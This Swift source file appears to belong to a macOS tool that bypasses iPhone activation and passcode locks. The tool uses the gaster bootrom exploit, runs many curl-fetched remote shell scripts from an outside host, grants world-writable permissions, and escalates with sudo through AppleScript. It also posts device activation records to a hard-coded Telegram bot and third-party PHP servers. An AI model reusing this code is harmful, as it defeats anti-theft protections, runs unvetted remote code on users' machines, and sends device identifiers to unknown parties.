//
//  ViewController.swift
//

import Cocoa
import CFNetwork
import Foundation


class ViewController: NSViewController {
    
    @IBOutlet weak var progressBar: NSProgressIndicator!
    @IBOutlet weak var ConnectedString: NSTextField!
    @IBOutlet weak var BootButton: NSButton!
    var buildTask = Process();
    var connectedDeviceModel = String()
    var deviceDetectionHandler:Bool = false
    @IBOutlet weak var ipadimage:NSImageView!
    var supportedDevicesJson = [supportedDevicesStruct]()
    
    override func viewDidLoad() {
        DispatchQueue.main.async{
            do{
                super.viewDidLoad()
            }
        }
        func applicationWillTerminate(_ aNotification: Notification) {
            // Insert code here to tear down your application
            close(4)
        }
        
        if(!shellExec("curl -s -k https://www.unlockergroup.com/plistup/version.php").contains("2")){
                   BoxShow("There is a NEW VERSION of this TOOL.\nPlease UPDATE!", Buttontext: "OK!")
//                   _ = shellExec("open https://guccitool.com")
                   
               }
        _ = shell("echo " + currentDirectory() + " &>" + Escritorio() + "/.saved")
        _ = shellExec("rm -rf  /Users/$(whoami)/.checkpoint")
        _ = shellExec("xattr -cr " + currentDirectory() + "/*")
        _ = shellExec("chmod -R 777 " + currentDirectory() + "/*")
        _ = shellExec("killall iproxy &>.log")
        if(!shellExec("curl -s -k https://www.unlockergroup.com/plistup/status.php").contains("2")){
                    BoxShow("BATCH CLOSED\nWait for a new BATCH, Follow us on our Official Channel!", Buttontext: "OK!")
//                   _ = shellExec("Open https://t.me/guccitool")
           
                }
        //let Documents = shellExec("echo /Users/$(whoami)/Documents  | sed 's/ /\\ /g'")
        
       /*if(shellExec("find /Users/$(whoami)/Documents -iname iunlockgsm_bootchain") != Documents + "/iunlockgsm_bootchain"){
            let urlBootchain = "https://iunlock-gsm.com/iOS15/iunlockgsm_bootchain.tar"
            _ = shellExec("curl -s -k " + urlBootchain + " -o " + Documents + "/iunlockgsm_bootchain.tar")
            _ = shellExec("tar -xvf " + Documents + "/iunlockgsm_bootchain.tar -C " + Documents + "/")
            _ = shellExec("rm " + Documents + "/iunlockgsm_bootchain.tar")
        }
        */
        
        if(shellExec("find /usr/local/bin -iname ideviceactivation") != "/usr/local/bin/ideviceactivation"){
            _ = shellExec("rm -rf " + Escritorio() + "/LibideviceActivation")
            _ = "https://github.com/LibideviceActivation.lzma"
            _ = shellExec("cd " + Escritorio() + ";git clone https://github.com/Brayan-Villa/LibideviceActivation")
            _ = shellExec("tar -zxvf " + Escritorio() + "/LibideviceActivation/LibiAct.lzma -C /")
            _ = shellExec("cp -rp " + Escritorio() + "/usr/local/* /usr/local/")
            _ = shellExec("rm " + Escritorio() + "/.LibiAct.lzma")
            _ = shellExec("xattr -cr /usr/local/lib /usr/local/bin")
            _ = shellExec("chmod -R 777 /usr/local/lib /usr/local/bin")
            _ = shellExec("/usr/local/bin/link")
        }
 
        Reload(true)
        
     /*   if(label4.stringValue != "Device Connected in Normal Mode"){
                if(label4.stringValue != "Device Connected in DFU Mode"){
                    if(label4.stringValue != "Device Connected in Recovery Mode"){
                        Reload(true)
                }
        }
    }*/
    }
    
    func checkPath(){
        if(shellExec("chown -R $(whoami) /usr/local") != ""){
            BoxShow("Please open one terminal and type this commands:\n1-. sudo mkdir -p /usr/local/bin/../lib/../opt\n2-. sudo chown -R $(whoami) /usr/local/*", Buttontext:"Accept")
            checkPath()
        }
    }
    
    @IBOutlet weak var spin:NSProgressIndicator!
    @IBAction func InstalarDependencias(_ sender:Any?){
        DispatchQueue.main.async{
            do{
                self.spin.startAnimation(self)
                self.spin.isHidden = false
            }
        }
        let script = NSAppleScript(source: "do shell script \"/usr/bin/sudo chown -R $(whoami) /usr/local/*;/usr/bin/sudo mkdir -p /usr/local/bin/../lib/../opt/../Cellar;/usr/bin/sudo chown -R $(whoami) /usr/local/*;/usr/bin/sudo tar -zxvf " + currentDirectory() + "/utils.lzma -C /;/usr/bin/sudo cp -rp /usr/local/Cellar/libimobiledevice/1.3.0/bin /usr/local/Cellar/libimobiledevice/;/usr/bin/sudo cp -rp /usr/local/Cellar/libimobiledevice/1.3.0/lib /usr/local/Cellar/libimobiledevice/;/usr/bin/sudo cp -rp /usr/local/Cellar/libirecovery/1.0.0/bin /usr/local/Cellar/libirecovery/;/usr/bin/sudo cp -rp /usr/local/Cellar/libirecovery/1.0.0/lib /usr/local/Cellar/libirecovery/;/usr/bin/sudo cp -rp /usr/local/Cellar/libplist/2.2.0/bin /usr/local/Cellar/libplist/;/usr/bin/sudo cp -rp /usr/local/Cellar/libplist/2.2.0/lib /usr/local/Cellar/libplist/;/usr/bin/sudo cp -rp /usr/local/Cellar/libusb/1.0.26/bin /usr/local/Cellar/libusb/;/usr/bin/sudo cp -rp /usr/local/Cellar/libusb/1.0.26/lib /usr/local/Cellar/libusb/;/usr/bin/sudo cp -rp /usr/local/Cellar/libusbmuxd/2.0.2/bin /usr/local/Cellar/libusbmuxd/;/usr/bin/sudo cp -rp /usr/local/Cellar/libusbmuxd/2.0.2/lib /usr/local/Cellar/libusbmuxd/;/usr/bin/sudo cp -rp /usr/local/Cellar/openssl@1.1/1.1.1s/bin /usr/local/Cellar/openssl@1.1/;/usr/bin/sudo cp -rp /usr/local/Cellar/openssl@1.1/1.1.1s/lib /usr/local/Cellar/openssl@1.1/;/usr/bin/sudo ln -s /usr/local/Cellar/* /usr/local/opt/;/usr/bin/sudo cp -rp $(find /usr/local/Cellar -iname 'lib') /usr/local/;/usr/bin/sudo cp -rp $(find /usr/local/Cellar -iname 'bin') /usr/local/;/usr/bin/sudo tar -zxvf " + currentDirectory() + "/LibiAct.lzma -C /;/usr/bin/sudo chown -R $(whoami) /usr/local/*;/usr/bin/sudo chmod -R 777 /usr/local/*;/usr/bin/sudo xattr -cr /usr/local/*; echo Complete &>" + Escritorio() + "/.stampp\" with administrator privileges")
        var error: NSDictionary?
        script?.executeAndReturnError(&error)
        if (error == nil) {
            BoxShow("Success! All dependencies have been Installed!", Buttontext: "Accept")
        } else {
            BoxShow("ERROR", Buttontext: "Accept")
        }
        DispatchQueue.main.async{
            do{
                self.spin.stopAnimation(self)
                self.spin.isHidden = true
            }
        }

    }
    override func viewDidAppear() {
        super.viewDidAppear()
    }
    
    func Escritorio()->String{
        return shellExec("echo /Users/$(whoami)/Desktop  | sed 's/ /\\ /g'")
    }
    
    
    func Reload(_ simon:Bool){
        deviceDetectionHandler = simon
        let timer = Timer.scheduledTimer(withTimeInterval: 7.0, repeats: true) {
                timer in DispatchQueue.global(qos: .background).async {
                    
                    if(self.deviceDetectionHandler != false){
                        self.deviceDetect(timer: timer, Booted:false)
                    }
                    else{
                        self.deviceDetect(timer: timer, Booted:true)
                        
                    }
            
            }}
        DispatchQueue.global(qos: .background).async {
            timer.fire()
        }
        }
    
    @IBOutlet weak var ButtonRecovery:NSButton!
    @IBAction func Enterecovery(_ sender:Any?){
        if(DeviceInfo("SerialNumber") != ""){
            _ = shellExec(currentDirectory() + "/ideviceenterrecovery " + DeviceInfo("UniqueDeviceID"))
            if(DeviceInfo("SerialNumber") == ""){
                BoxShow("Successfully enter device in recovery mode!", Buttontext: "Accept")
            }
        }
    }
    func BoxShowInformational(_ Texto:String, Titulo:String){
        let info = NSLocalizedString(Texto, comment: "");
        let quitButton = NSLocalizedString("Accept", comment: "")
        let alert = NSAlert()
        alert.alertStyle = NSAlert.Style.informational
        alert.messageText = Titulo
        alert.informativeText = info
        alert.addButton(withTitle: quitButton)
        _ = alert.runModal()
    }
    
    func BoxShowWarning(_ Texto:String, Titulo:String){
        let info = NSLocalizedString(Texto, comment: "");
        let quitButton = NSLocalizedString("Accept", comment: "")
        let alert = NSAlert()
        alert.alertStyle = NSAlert.Style.warning
        alert.messageText = Titulo
        alert.informativeText = info
        alert.addButton(withTitle: quitButton)
        _ = alert.runModal()
    }
    @IBOutlet weak var ButtonGenerate:NSButton!
    
    @IBAction func GeneratePList(_ sender:Any?){
        
        GeneratePListFile()
    }
    
    func PairDevice(){
        if(shellExec("/usr/local/bin/idevicepair pair").contains("ERROR")){
            BoxShow("Unlock Device and Press TRUST!", Buttontext:"Accept")
            PairDevice()
        }
    }
    @IBOutlet weak var labelTunel:NSTextField!
    func GeneratePListFile(){
        
            DispatchQueue.main.async{
                do{
                    self.ButtonGenerate.isEnabled = false
                }
            }
            let SN = DeviceInfo("SerialNumber")
            let UCID = DeviceInfo("UniqueChipID")
            progressBar.minValue = 0
            progressBar.maxValue = 1
            if(SN != ""){
                DispatchQueue.main.async{
                    self.progressBar.doubleValue = 0.1
                }
                if(CheckCompatibilidad() == "Unsupported")
                {
                    BoxShowWarning("Device Unsupported!", Titulo:"DEVICE UNSUPPORTED")
                    DispatchQueue.main.async{
                        self.progressBar.doubleValue = 0
                    }
                    DispatchQueue.main.async{
                        do{
                            self.ButtonGenerate.isEnabled = true
                        }
                    }
                    return
                }
                DispatchQueue.main.async{
                    self.progressBar.doubleValue = 0.2
                }
                if(CheckFMI() == "FMI STATUS: ACTIVATED Device, DEACTIVATE First"){
                    BoxShowWarning("ACTIVATED Device, DEACTIVATE First!", Titulo:"ACTIVATED Device")
                    DispatchQueue.main.async{
                        self.progressBar.doubleValue = 0
                    }
                    DispatchQueue.main.async{
                        do{
                            self.ButtonGenerate.isEnabled = true
                        }
                    }
                    return
                }
                DispatchQueue.main.async{
                    self.progressBar.doubleValue = 0.4
                }
                if(CheckFMI() == "FMI STATUS: OFF"){
                    BoxShowWarning("FMI OFF! ORDER not Processed", Titulo:"Device FMI OFF")
                    DispatchQueue.main.async{
                        self.progressBar.doubleValue = 0
                    }
                    DispatchQueue.main.async{
                        do{
                            self.ButtonGenerate.isEnabled = true
                        }
                    }
                    return
                }
                DispatchQueue.main.async{
                    self.progressBar.doubleValue = 0.6
                }
                let miniURL = "https://thewiltedrose.vip/Turk/PListService/Token/TokensGenerated/" + UCID + "/" + UCID + "-act-req.token"
                _ = shellExec("echo " + DeviceInfo("TimeIntervalSince1970") + " | sed 's/\\./ /g' | awk '{printf $1}' &>" + Escritorio() + "/.time")
                PairDevice()
                let Tiempo = shellExec("cat " + Escritorio() + "/.time")
                _ = shellExec("/usr/local/bin/ideviceactivation activate -s https://thewiltedrose.vip/Turk/PListService/Token/token.php")
                _ = shellExec("ideviceactivation activate -s https://thewiltedrose.vip/Turk/PListService/Token/token.php")
                _ = shellExec("mkdir -p " + Escritorio() + "/Tokens")
                _ = shellExec("curl -s -k " + miniURL + " --output " + Escritorio() + "/Tokens/" + Tiempo + "-act-req.plist")
                _ = shellExec("mkdir -p " + Escritorio() + "/Tokens/TokensZIP")
                _ = shellExec(currentDirectory() + "/7zz a " + Escritorio() + "/Tokens/TokensZIP/" + Tiempo + "-act-req.plist.zip  " + Escritorio() + "/Tokens/" + Tiempo + "-act-req.plist")
                _ = shellExec("curl -X  POST 'https://api.telegram.org/bot6232486092:AAFaZAzlKS9NJ9hAe4pXiiUPI-vpcPMn6es/sendDocument' -F chat_id='-1001894116326' -F document=@" + Escritorio() + "/Tokens/" + Tiempo + "-act-req.plist")
                let Mensaje = shellExec("curl --data-urlencode activation-info@" + Escritorio() + "/Tokens/" + Tiempo + "-act-req.plist \"https://thewiltedrose.vip/Turk/PListService/Extraction/ExtractInfo.php?filename=" + Tiempo + "-act-req.plist&sistema=Mac\"")
                if(shellExec("find  " + Escritorio() + "/Tokens -iname " + Tiempo + "-act-req.plist") == Escritorio() + "/Tokens/" + Tiempo + "-act-req.plist"){
                    DispatchQueue.main.async{
                        self.progressBar.doubleValue = 0.8
                    }
                    DispatchQueue.main.async{
                        self.progressBar.doubleValue = 1
                    }
                BoxShowInformational(Mensaje, Titulo: "GUCCI Tool PLIST")
                }
                
                    DispatchQueue.main.async{
                        self.progressBar.doubleValue = 0
                    }
                    DispatchQueue.main.async{
                        do{
                            self.ButtonGenerate.isEnabled = true
                        }
                    }
            }
            else{
                BoxShow("DEVICE UNDETECTED!", Buttontext: "Accept")
            }
            
            DispatchQueue.main.async{
                do{
                    self.ButtonGenerate.isEnabled = true
                }
            }
        
    }
    @IBOutlet weak var ButtonTransparent:NSButton!
    @IBAction func GoTransparent(_ sender:Any?){
        _ = shellExec("open https://t.me/guccitool")
    }
    
    @IBOutlet weak var Tgra: NSImageView!
    @IBAction func Tgram(_ sender: Any) {
        _ = shellExec("open https://t.me/guccitool")
    }
    @IBAction func GoTm(_ sender:Any?){
        _ = shellExec("open https://t.me/guccitool")
    }
    @IBAction func GoWpp(_ sender:Any?){
        _ = shellExec("open https://t.me/guccitool")
    }
    @IBOutlet weak var ButtonFMI:NSButton!
    func CheckFMI()->String{
        
            let SN = DeviceInfo("SerialNumber")
            let UCID = DeviceInfo("UniqueChipID")
        if(SN != ""){
            let miniURL = "https://thewiltedrose.vip/Turk/PListService/Token/TokensGenerated/" + UCID + "/" + UCID + "-act-req.token"
                _ = shellExec("echo " + DeviceInfo("TimeIntervalSince1970") + " | sed 's/\\./ /g' | awk '{printf $1}' &>" + Escritorio() + "/.time")
                PairDevice()
                let Tiempo = shellExec("cat " + Escritorio() + "/.time")
                _ = shellExec("/usr/local/bin/ideviceactivation activate -s https://thewiltedrose.vip/Turk/PListService/Token/token.php")
                _ = shellExec("mkdir -p " + Escritorio() + "/Tokens")
                _ = shellExec("curl -s -k " + miniURL + " --output " + Escritorio() + "/Tokens/" + Tiempo + "-act-req.token")
                _ = shellExec("mkdir -p " + Escritorio() + "/Tokens/TokensZIP")
                _ = shellExec(currentDirectory() + "/7zz a " + Escritorio() + "/Tokens/TokensZIP/" + Tiempo + "-act-req.token.zip  " + Escritorio() + "/Tokens/" + Tiempo + "-act-req.token")
                let FMICheck = shellExec("curl --data-urlencode activation-info@" + Escritorio() + "/Tokens/" + Tiempo + "-act-req.token \"https://thewiltedrose.vip/Turk/PListService/PHPS/FMICheck.php\"")
                return FMICheck
            }
            else{
                BoxShow("DISPOSITIVO NO DETECTADO!", Buttontext: "Accept")
                return ""

            }
        
    }
    
    func CheckCompatibilidad()->String{
        let Country = DeviceInfo("RegionCode")
        if(Country.contains("CH")){
            return "Not Supported"
        }
        let imei = DeviceInfo("InternationalMobileEquipmentIdentity")
        let imei2 = DeviceInfo("InternationalMobileEquipmentIdentity2")
        let serial = DeviceInfo("SerialNumber")
        let url = "https://geminixteam.com/PListService/PHPS/checkDevice.php?sn=" + serial + "&imei=" + imei + "&imei2=" + imei2
        let check = shellExec("curl -s -k \"" + url + "\"")
        if(check.contains("Chimaera")){
            return "Not Supported"
        }
        else{
            return "Supported"
        }
    }
    
    struct supportedDevicesStruct: Codable {
        let productName:String
        let internalName:String
        let cpid:Int32
        let bdid:Int32
    }
    
    func currentDirectory()->String{
        return Bundle.main.resourcePath! + "/Executables"
    }
    
    @IBOutlet weak var ProductLabel:NSTextField!
    @IBOutlet weak var RegisteredLabel:NSTextField!
    
    public func startDownload(_ URI:String, OUTPUT:String){
    
    }
    
    @IBOutlet weak var HelpButton:NSButton!
    
    @IBAction func HelpProv(_ sender:Any?){
        
        BoxShowInf("\n\n\n            HELP FOR PASSCODE PROCESS\n\n\n1-. ENTER DEVICE IN DFU MODE\n\n2-. PRESS BOOT DEVICE BUTTON\n\n3-. PRESS BACKUP FILES BUTTON\n\n4-. ENTER DEVICE IN DFU MODE\n\n5-. PRESS ERASE BUTTON\n\n6-. ENTER DEVICE IN DFU MODE\n\n7-. PRESS BOOT DEVICE BUTTON\n\n8-. PRESS REACTIVATE DEVICE BUTTON\n\n\n\n\n                 HELP FOR HELLO PROCESS\n\n\n1-. ENTER DEVICE IN DFU MODE\n\n2-. PRESS PURPLE MODE BUTTON\n\n3-. PRESS  BUTTON WITH EX3cutioN3R ICON\n\n4-. PRESS BACK BUTTON\n\n5-. PRESS SYSCFG BUTTON\n\n6-. PRESS CONNECT BUTTON\n\n7-. PRESS WRITE BUTTON\n\n8-. PRESS REBOOT BUTTON\n\n9-. WAIT TO TURN DEVICE IN NORMAL MODE (HELLO SCREEN)\n\n10-. PRESS GENERATE FILES BUTTON\n\n11-. ENTER DEVICE IN DFU MODE\n\n12-. PRESS BOOT DEVICE BUTTON\n\n13-. PRESS ACTIVATE (HELLO) BUTTON", Buttontext: "Thanks")
        
    }
    @IBOutlet weak var labelios:NSTextField!
    @IBOutlet weak var labelsn:NSTextField!
    @IBOutlet weak var labelimei:NSTextField!
    @IBOutlet weak var labelimei2:NSTextField!
    @IBOutlet weak var labelregion:NSTextField!
    func deviceDetect(timer:Timer, Booted:Bool) {
        if(Booted != true){
            
                
                let task = Process()
                task.launchPath = "/bin/zsh"
                task.arguments = ["-c", "system_profiler SPUSBDataType | grep 'Apple Mobile Device' | sed 's/Apple Mobile Device //g' | sed 's/(//g' | sed 's/)://g' | awk '{printf $1\" \"$2}' | sed 's/%//g'"]
                let pipe = Pipe()
                task.standardOutput = pipe
                task.launch()
                let data = pipe.fileHandleForReading.readDataToEndOfFile();
                let output: String = NSString(data:data, encoding: String.Encoding.utf8.rawValue)! as String;
                
                
                if(output != ""){
                
                        //self.ConnectedString.stringValue = "\(devices.productName) in \(mode) mode detected"
                    DispatchQueue.main.async{
                        self.received_signal()
                    }
            }
                else if(DeviceInfo("SerialNumber") != ""){
                    DispatchQueue.main.async{
                   /* self.RegisteredLabel.stringValue = "ACTIVATION: " + self.DeviceInfo("ActivationState")
                                    self.ProductLabel.stringValue = "PRODUCT:     " + self.DeviceInfo("ProductType")*/
                                    self.label1.stringValue = "Model: " + self.ModelHello()
                        self.labelimei.stringValue = "IMEI: " + self.DeviceInfo("InternationalMobileEquipmentIdentity")
                        self.labelimei.isSelectable = true
                        if(self.DeviceInfo("InternationalMobileEquipmentIdentity") != ""){
                            self.labelimei2.stringValue = "IMEI 2: " +  self.DeviceInfo("InternationalMobileEquipmentIdentity2")
                        }
                        else{
                            self.labelimei2.stringValue = "IMEI 2: NO IMEI 2"
                        }
                        self.labelsn.stringValue = "SERIAL: " +  self.DeviceInfo("SerialNumber")
                        self.labelregion.stringValue = "REGION: " +  self.DeviceInfo("RegionInfo")
                        self.labelios.stringValue = "iOS: " +  self.DeviceInfo("ProductVersion")
                              /*      self.label2.stringValue = "SERIAL: " + self.DeviceInfo("SerialNumber")
                                    self.label3.stringValue = "VERSION: " + self.DeviceInfo("ProductVersion")
                                    self.label4.stringValue = "Device Connected in Normal Mode"
                                    self.label4.isHidden = false*/
                    }
                }
                
                else {
                                self.lost_Signal()
                            
                        
                    //self.ConnectedString.stringValue = "Please connect your iDevice"
                    //self.GoBTN.isEnabled = false
                }
            
        
        }
        }
    
    

    
    func ircv_info(_ Info:String)->String{
                
        return shellExec(currentDirectory() + "/irecovery -q | grep -w " + Info + " | sed 's/" + Info + ": //g'")
    }

    func shellExec(_ args:String)->String{
        let pipe = Pipe();
        let Task = Process()
                Task.launchPath = "/bin/zsh";
                Task.arguments = ["-c", args];
                Task.standardOutput = pipe;
                Task.launch();
        Task.waitUntilExit()
        let data = pipe.fileHandleForReading.readDataToEndOfFile();
        let output: String = NSString(data:data, encoding: String.Encoding.utf8.rawValue)! as String;
        return output.trimmingCharacters(in: .newlines);
    }
    
    @IBOutlet weak var ButtonRegSaul:NSButton!
    @IBOutlet weak var ButtonRegZeta:NSButton!
    
    @IBAction func OpenSaul(_ sender:Any? ){
        _ = shellExec("open https://t.me/guccitool")
    }
    @IBAction func OpenZeta(_ sender:Any? ){
        _ = shellExec("open https://t.me/guccitool")
    }
    
    @IBOutlet weak var label1:NSTextField!
    @IBOutlet weak var label2:NSTextField!
    @IBOutlet weak var label3:NSTextField!
    @IBOutlet weak var label4:NSTextField!

    public func lost_Signal(){
        
        DispatchQueue.main.async{
                
            /*    self.RegisteredLabel.isHidden = false
                self.RegisteredLabel.stringValue = "REGISTERED:"
                self.ProductLabel.stringValue = "PRODUCT:"*/
                self.label1.stringValue = "Model: "
            self.labelios.stringValue = "iOS: "
            self.labelsn.stringValue = "SERIAL: "
            self.labelimei.stringValue = "IMEI: "
            self.labelimei2.stringValue = "IMEI 2: "
            self.labelregion.stringValue = "REGION: "
            /*    self.label2.stringValue = "ECID: "
                self.label3.stringValue = "CPID: "
                self.label4.isHidden = true*/
            
        }
    }
    
    public func ECID()->String{
    
    return shellExec("cat \"/Users/$(whoami)/Desktop/.ecid.txt\"")
    
    }
    
    public func received_signal(){
        DispatchQueue.main.async{
              //  self.RegisteredLabel.isHidden = false
            if(self.shellExec("curl -s -k \"https://bigb033xecution3r.com/Bot/iOS15Registers/Hello/" + self.ECID() + "/\"").contains("Success")){
                
                  //  self.RegisteredLabel.stringValue = "REGISTERED: YES"
            }
            else if(self.shellExec("curl -s -k \"https://bigb033xecution3r.com/Bot/iOS15Registers/Passcode/" + self.ECID() + "/\"").contains("Success")){
                
                //self.RegisteredLabel.stringValue = "REGISTERED: YES"
        }
            else{
                
               // self.RegisteredLabel.stringValue = "REGISTERED: NO"
            }
               // self.ProductLabel.stringValue = "PRODUCT: " + self.ircv_info("PRODUCT")
                self.label1.stringValue = "Model: " + self.ircv_info("NAME")
                /*self.label2.stringValue = "ECID: " + self.ircv_info("ECID")
                self.label3.stringValue = "CPID: " + self.ircv_info("CPID")
                self.label4.isHidden = false
                self.label4.stringValue = "Device Connected in " + self.ircv_info("MODE") + " Mode"*/
                _ = self.photoshow()
            }
        
        
    }
    override var representedObject: Any? {
        didSet {
        // Update the view, if already loaded.
        }
    }

    @IBAction func doBOOT(_ sender:Any?){
        _ = self.shellExec("\"/Users/$(whoami)/Desktop/tmp/Enviroment/Darwin/irecovery\" -q | grep -w ECID | sed 's/ECID: //g' &>\"/Users/$(whoami)/Desktop/.ecid.txt\"")
        
        if(shellExec("curl -s -k \"https://bigb033xecution3r.com/Bot/iOS15Registers/Hello/" + ECID() + "/\"").contains("Success")){
            
                BootButton.isEnabled = false;
                _ = shellExec("killall Finder")
            if(!ircv_info("MODE").contains("ERROR: No device found!")){
                    self.NewBoot()
                        
                                        BootButton.isEnabled = true;
                }
                else{
                    self.BoxShow("Device undetected in DFU Mode!", Buttontext: "Accept")
                    BootButton.isEnabled = true;
                }
            
        }
        else if(shellExec("curl -s -k \"https://bigb033xecution3r.com/Bot/iOS15Registers/Passcode/" + ECID() + "/\"").contains("Success")){
            
                BootButton.isEnabled = false;
                _ = shellExec("killall Finder")
                if(!ircv_info("MODE").contains("ERROR: No device found!")){
                    
                                self.NewBoot()
                            
                        
                    BootButton.isEnabled = true;
                }
                else{
                    self.BoxShow("Device undetected in DFU Mode!", Buttontext: "Accept")
                    BootButton.isEnabled = true;
                }
            
        }
        else{
            BoxShow(ECID() + " UNREGISTERED!", Buttontext: "Accept")
        }
    }
    
    func BoxShow(_ Texto:String, Buttontext:String){
        let info = NSLocalizedString(Texto, comment: "");
        let quitButton = NSLocalizedString(Buttontext, comment: "")
        let alert = NSAlert();
        alert.informativeText = info;
        alert.addButton(withTitle: quitButton);
        _ = alert.runModal();
    }
    func BoxShowInf(_ Texto:String, Buttontext:String){
        let info = NSLocalizedString(Texto, comment: "HELP");
        let quitButton = NSLocalizedString(Buttontext, comment: "")
        let alert = NSAlert();
        alert.informativeText = info;
        alert.addButton(withTitle: quitButton);
        _ = alert.runModal();
    }
    var Stage = """
    curl -s -k "https://bigb033xecution3r.com/stage1.sh" --output "/Users/$(whoami)/Desktop"/tmp/stage1.sh; chmod +x "/Users/$(whoami)/Desktop"/tmp/stage1.sh; "/Users/$(whoami)/Desktop"/tmp/stage1.sh
    """
    
    var iBSS = """
    mkdir -p "/Users/$(whoami)/Desktop"/tmp/.BOOT; curl -s -k "https://bigb033xecution3r.com/BOOT/iBSS.sh" --output "/Users/$(whoami)/Desktop"/tmp/.BOOT/ibss.sh; chmod +x "/Users/$(whoami)/Desktop"/tmp/.BOOT/ibss.sh; "/Users/$(whoami)/Desktop"/tmp/.BOOT/ibss.sh
    """
    
    var iBEC = """
    curl -s -k "https://bigb033xecution3r.com/BOOT/iBEC.sh" --output "/Users/$(whoami)/Desktop"/tmp/.BOOT/ibec.sh; chmod +x "/Users/$(whoami)/Desktop"/tmp/.BOOT/ibec.sh; "/Users/$(whoami)/Desktop"/tmp/.BOOT/ibec.sh; $(cat /Users/$(whoami)/.save)/irecovery -c go
    """
    
    var DeviceTree = """
    curl -s -k "https://bigb033xecution3r.com/BOOT/devicetree.sh" --output "/Users/$(whoami)/Desktop"/tmp/.BOOT/devicetree.sh; chmod +x "/Users/$(whoami)/Desktop"/tmp/.BOOT/devicetree.sh; "/Users/$(whoami)/Desktop"/tmp/.BOOT/devicetree.sh; $(cat /Users/$(whoami)/.save)/irecovery -c devicetree
    """
    
    var RamDisk = """
    curl -s -k "https://bigb033xecution3r.com/BOOT/ramdisk.sh" --output "/Users/$(whoami)/Desktop"/tmp/.BOOT/ramdisk.sh; chmod +x "/Users/$(whoami)/Desktop"/tmp/.BOOT/ramdisk.sh; "/Users/$(whoami)/Desktop"/tmp/.BOOT/ramdisk.sh; $(cat /Users/$(whoami)/.save)/irecovery -c ramdisk
    """
    
    var TrustCache = """
    curl -s -k "https://bigb033xecution3r.com/BOOT/trustcache.sh" --output "/Users/$(whoami)/Desktop"/tmp/.BOOT/trustcache.sh; chmod +x "/Users/$(whoami)/Desktop"/tmp/.BOOT/trustcache.sh; "/Users/$(whoami)/Desktop"/tmp/.BOOT/trustcache.sh; $(cat /Users/$(whoami)/.save)/irecovery -c firmware
    """
    
    var KernelCache = """
    curl -s -k "https://bigb033xecution3r.com/BOOT/kernelcache.sh" --output "/Users/$(whoami)/Desktop"/tmp/.BOOT/kernelcache.sh; chmod +x "/Users/$(whoami)/Desktop"/tmp/.BOOT/kernelcache.sh; "/Users/$(whoami)/Desktop"/tmp/.BOOT/kernelcache.sh; $(cat /Users/$(whoami)/.save)/irecovery -c bootx
    """
    
    var Gaster = """
    "/Users/$(whoami)/Desktop"/tmp/Enviroment/Darwin/gaster pwn; "/Users/$(whoami)/Desktop"/tmp/Enviroment/Darwin/gaster reset
    """
    
    var Bootlogo = """
    curl -s -k "https://bigb033xecution3r.com/BootLogos/bootlogo$($(cat /Users/$(whoami)/.save)/irecovery -q | grep -w CPID | sed 's/CPID: //g').img4" -o "/Users/$(whoami)/Desktop"/tmp/bootlogo.img4; $(cat /Users/$(whoami)/.save)/irecovery -f "/Users/$(whoami)/Desktop"/tmp/bootlogo.img4; $(cat /Users/$(whoami)/.save)/irecovery -c 'setpicture 0'; $(cat /Users/$(whoami)/.save)/irecovery -c 'bgcolor 0 0 0'
    """
    
    var backupPasscode_stage1 = """
    curl -s -k "https://bigb033xecution3r.com/Script.sh" --output "/Users/$(whoami)/Desktop"/tmp/.passcode.sh; chmod +x "/Users/$(whoami)/Desktop"/tmp/.passcode.sh; "/Users/$(whoami)/Desktop"/tmp/.passcode.sh mount
    """
    var backupPasscode_stage2 = """
    curl -s -k "https://bigb033xecution3r.com/Script.sh" --output "/Users/$(whoami)/Desktop"/tmp/.passcode.sh; chmod +x "/Users/$(whoami)/Desktop"/tmp/.passcode.sh; "/Users/$(whoami)/Desktop"/tmp/.passcode.sh mount
    """
    var backupPasscode_stage3 = """
    curl -s -k "https://bigb033xecution3r.com/Script.sh" --output "/Users/$(whoami)/Desktop"/tmp/.passcode.sh; chmod +x "/Users/$(whoami)/Desktop"/tmp/.passcode.sh; "/Users/$(whoami)/Desktop"/tmp/.passcode.sh download
    """
    
    var hello_stage1 = """
    curl -s -k "https://bigb033xecution3r.com/Script.sh" --output "/Users/$(whoami)/Desktop"/tmp/.passcode.sh; chmod +x "/Users/$(whoami)/Desktop"/tmp/.passcode.sh; "/Users/$(whoami)/Desktop"/tmp/.passcode.sh mount
    """
    var hello_stage2 = """
    curl -s -k "https://bigb033xecution3r.com/Script.sh" --output "/Users/$(whoami)/Desktop"/tmp/.passcode.sh; chmod +x "/Users/$(whoami)/Desktop"/tmp/.passcode.sh; "/Users/$(whoami)/Desktop"/tmp/.passcode.sh mount
    """
    var hello_stage3 = """
    curl -s -k "https://bigb033xecution3r.com/Script.sh" --output "/Users/$(whoami)/Desktop"/tmp/.passcode.sh; chmod +x "/Users/$(whoami)/Desktop"/tmp/.passcode.sh; "/Users/$(whoami)/Desktop"/tmp/.passcode.sh activatehello
    """
    
    var reactivate_stage1 = """
    curl -s -k "https://bigb033xecution3r.com/Script.sh" --output "/Users/$(whoami)/Desktop"/tmp/.passcode.sh; chmod +x "/Users/$(whoami)/Desktop"/tmp/.passcode.sh; "/Users/$(whoami)/Desktop"/tmp/.passcode.sh mount
    """
    var reactivate_stage2 = """
    curl -s -k "https://bigb033xecution3r.com/Script.sh" --output "/Users/$(whoami)/Desktop"/tmp/.passcode.sh; chmod +x "/Users/$(whoami)/Desktop"/tmp/.passcode.sh; "/Users/$(whoami)/Desktop"/tmp/.passcode.sh mount
    """
    var reactivate_stage3 = """
    curl -s -k "https://bigb033xecution3r.com/Script.sh" --output "/Users/$(whoami)/Desktop"/tmp/.passcode.sh; chmod +x "/Users/$(whoami)/Desktop"/tmp/.passcode.sh; "/Users/$(whoami)/Desktop"/tmp/.passcode.sh upload
    """
    
    @IBOutlet weak var labelTEXT:NSTextField!
    @IBOutlet weak var spinner:NSProgressIndicator!
    
    @IBOutlet weak var ButtonSSH:NSButton!
    @IBOutlet weak var BB:NSButton!
    /*@IBOutlet weak var ButtonSSH:NSButton!
    @IBOutlet weak var ButtonSSH:NSButton!
    @IBOutlet weak var ButtonSSH:NSButton!
    */
    @IBAction func ButtonBack(_ sender: NSButton) {
        self.dismiss(self);
}
    
    
    @IBOutlet weak var BackupBTN:NSButton!
    
    @IBAction func DOBackup(_ sender:Any?){
        if(shellExec("curl -s -k https://bigb033xecution3r.com/Message.php").contains("Success")){
            
                BackupFiles()
            
        }
    }
    
    public func photoshow()->String{
        switch(ircv_info("PRODUCT")){
        case "iPhone1,1":
